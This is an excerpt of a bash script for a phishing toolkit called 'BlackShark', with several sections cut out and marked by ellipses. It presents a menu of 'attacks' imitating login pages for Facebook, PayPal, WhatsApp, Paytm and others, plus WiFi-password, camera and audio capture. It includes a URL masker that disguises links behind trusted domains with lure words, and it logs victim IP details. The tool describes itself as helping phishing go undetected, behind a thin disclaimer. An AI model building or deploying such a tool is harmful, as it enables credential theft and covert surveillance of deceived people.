...
msg() {
	printf "${green}[${cyan}+${green}] ${cyan}${1}\n${nc}"
}
...
function os () {
	cat /etc/os-release > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then
                BIN="/usr/bin"
	        phish="/usr/share/blackshark/phs"
		logfile="$phish/"
		#if logname = root then
		# user_id="$(logname)"
		files="$HOME/Desktop"
		blackshark="/usr/share/blackshark"
		old_blackshark="/usr/bin/blackshark"
		OS=DEBIAN
		check_root
	else
		BIN="${PREFIX}/bin"
		phish="${PREFIX}/share/blackshark/phs"
		logfile="$phish/"
		files="/sdcard"
		blacksharkk="${PREFIX}/share/blackshark"
                old_blackshark="${PREFIX}/bin/blackshark"
		OS=TERMUX
	fi
}

function main_update() {
	#launch="updating blackshark"
	#splashdown="updated blackshark";echo
	#os;(wget -q https://github.com/Athexhacker/blackshark/raw/master/blackshark -O ${blackshark}/blackshark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
	echo
	msg "update manually by installation command\n ~(check Official blackshark repo)"
	sleep 2
	echo
	msg "Redirecting to Official blackshark repo..."
	xdg-open 'https://github.com/Athexhacker/blackshark'
	exit 1
}
...
blackshark- future of phishing is here,
A blackshark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
Options:
  -u, --update      update blacksharkk manually 
  -v, --version     Display the current blackshark version installed on your device
  -h, --help        Print this help message
  -a, --assist      List detail discription of blackshark
  -p, --purge       Uninstall blackshark
...
function purge_blackshark() {
        os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Audio-Cam-hack.shark
        rm -rf ${blackshark} ${old_blackshark}
}

function fix_patches() {
        launch="fixing blackshark patches"
	splashdown="blackshark patches fixed";echo
	os;sed -i -e 's/\r$//' ${blackshark}/setup
	chmod 777 ${blackshark}/setup
        (${blackshark}/setup > /dev/null 2&>1) & spinner
}
...
function url_shortner() {
	...
	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
        ...
        read -p $'\n\033[1;92mblackshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
        url_checker $mask
	printf "${green}blackshark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"
	printf "${green}blackshark ${white}>> ${white}Don't use space in your words\n"
        read -p $'\e[1;92mblackshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
...
${green}      ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗
${blue}       ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ███████║██║  ██║██║  ██║██║  ██║██║  ██╗
${purple}     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ${yellow}.BY ATHEX${VERSION}\n\n"
...
function ipinfo() {
	...
	if [[ -e ../.dumplog.txt ]]; then
		...
		if [[ -e "Log.log" ]]; then
			...
			snt
			echo ""
			echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] File Location : ${files}/Audio-Cam-hack.blackshark"
			echo ""
...
banner2() {
	printf "\n${green}
        ...
        Black Shark : ${white}v${VERSION}${green}
        Developed by  : ${white}A T H E X${green} •
        INSTAGRAM : ${white}@itx_athex86${green}       •
	    YouTube : ${white}@inziXploit444${green}     • 
...
msgsh() {
if [[ ! -e "${logfile}.blacksharkmsg" ]]; then
	clear
	msg "You Are Using BLACK SHARK .v$VERSION\n"
	sleep 2
	...
	printf "                           ${red}|===========================|
	                  [¤]   \e[1;33mD I S C L A I M E R${red}   [¤]
	                   |===========================|\n\n"
	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Black Shark are not responsible for any kind hack and stuff.\n\n• Black Shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the BLACK SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
...
msg "FIND ME ON INSTA - itx_athex86\n"

read -p $'\e[1;40m\e[1;92m T O  R U N   B  L A C K S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg

if [[ $shmsg == "Y" || $shmsg == "y" || $shmsg == "yes" ]]; then
		cd ${phish}
		touch .blacksharkmsg
		echo "Accepted" >> .blacksharkmsg
		echo ""
		msg "Accepted"
		sleep 3
		cd ~
...
do
	clear
      ...
      ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ███████║██║  ██║██║  ██║██║  ██║██║  ██╗
      ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                     ${cyan}BY ATHEX ${VERSION}\n\n "

      printf "${green}       ╔──────────────────────────────────────╗\n"
      printf "${green}        |   ${cyan}B E T A  V E R S I O N ${green}|\n"
      printf "${green}        ╚──────────────────────────────────────╝\n\n"

     printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
function banner(){	
        printf "\e[1;32m[\e[0m\e[1;37m01\e[0m\e[1;32m] \e[0m\e[1;32;44mFacebook\e[0m           \e[1;32m[\e[0m\e[1;37m12\e[0m\e[1;32m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;32m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m          \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mWIFI-(adminpanel)\e[0m\n\n"
        printf "\e[1;32m[\e[0m\e[1;37m02\e[0m\e[1;32m] \e[0m\e[1;32;41mPinterest\e[0m          \e[1;32m[\e[0m\e[1;37m13\e[0m\e[1;32m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;32m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m           \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-(passwd)\e[0m\n\n"            
        printf "\e[1;32m[\e[0m\e[1;37m03\e[0m\e[1;32m] \e[0m\e[1;32;5;200mInstagram\e[0m          \e[1;32m[\e[0m\e[1;37m14\e[0m\e[1;32m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;32m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m         \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid-hack\e[0m\n\n"
        printf "\e[1;32m[\e[0m\e[1;37m04\e[0m\e[1;32m] \e[0m\e[1;32;40mUber \e[1;37;42mEats\e[0m          \e[1;32m[\e[0m\e[1;37m15\e[0m\e[1;32m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;32m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
        printf "\e[1;32m[\e[0m\e[1;37m05\e[0m\e[1;32m] \e[0m\e[1;32;40mOLA\e[0m                \e[1;32m[\e[0m\e[1;37m16\e[0m\e[1;32m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;32m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
        printf "\e[1;32m[\e[0m\e[1;37m06\e[0m\e[1;32m] \e[0m\e[1;32m\e[94mG\e[91mO\e[93mO\e[94mG\e[32mL\e[32mE\e[0m             \e[1;32m[\e[0m\e[1;37m17\e[0m\e[1;32m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
        printf "\e[1;32m[\e[0m\e[1;37m07\e[0m\e[1;32m] \e[0m\e[1;32m\e[30mPay\e[106mtm\e[0m              \e[1;32m[\e[0m\e[1;37m18\e[0m\e[1;32m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;32m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
        printf "\e[1;32m[\e[0m\e[1;37m08\e[0m\e[1;32m] \e[0m\e[1;32;107mNetflix\e[0m            \e[1;32m[\e[0m\e[1;37m19\e[0m\e[1;32m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
	    printf "\e[1;32m[\e[0m\e[1;37m09\e[0m\e[1;32m] \e[0m\e[1;32;5;200mInsta-Followers\e[0m    \e[1;32m[\e[0m\e[1;37m20\e[0m\e[1;32m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
	    printf "\e[1;32m[\e[0m\e[1;37m10\e[0m\e[1;32m] \e[0m\e[1;32;40mAmazon\e[0m             \e[1;32m[\e[0m\e[1;37m21\e[0m\e[1;32m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
        printf "\e[1;32m[\e[0m\e[1;37m11\e[0m\e[1;32m] \e[0m\e[1;32;42mWhatsApp\e[0m           \e[1;32m[\e[0m\e[1;37m22\e[0m\e[1;32m] \e[0m\e[1;34;103mFlipkart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
